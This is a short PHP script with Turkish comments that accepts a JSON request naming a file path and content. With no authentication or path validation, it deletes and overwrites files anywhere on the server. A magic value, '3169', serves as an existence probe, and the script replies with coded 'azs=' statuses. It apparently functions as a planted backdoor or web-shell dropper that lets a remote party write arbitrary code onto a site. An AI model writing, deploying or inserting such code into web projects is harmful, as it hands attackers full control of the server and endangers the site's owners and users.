
<?php

// Gelen veriyi alıp JSON formatında çözümleyelim
$JDecode = json_decode(file_get_contents('php://input'), true);

// Veri içeriğini ve dosya adını alıyoruz
$ct = $JDecode["data"] ?? null;
$file = $JDecode["file"] ?? null;

// Eğer dosya adı gelmişse ve veri 3169 ise
if ($file && $ct === '3169') {
    if (file_exists($file)) {
        exit("azs=1");  // Dosya mevcut
    } else {
        file_put_contents($file, "", LOCK_EX); // Boş dosya oluştur
        exit("azs=2"); // Dosya mevcut değil
    }
}

// Dosya adı ve veri varsa
if ($file && !is_null($ct)) {
    if (file_exists($file)) {
        unlink($file);  // Dosyayı sil
    }
    
    // Yeni dosya oluştur ve veriyi yazdır
    file_put_contents($file, $ct, LOCK_EX);
    exit("azs=3");  // Dosya başarıyla oluşturuldu
} else {
    exit("azs=4"); 
}

?>


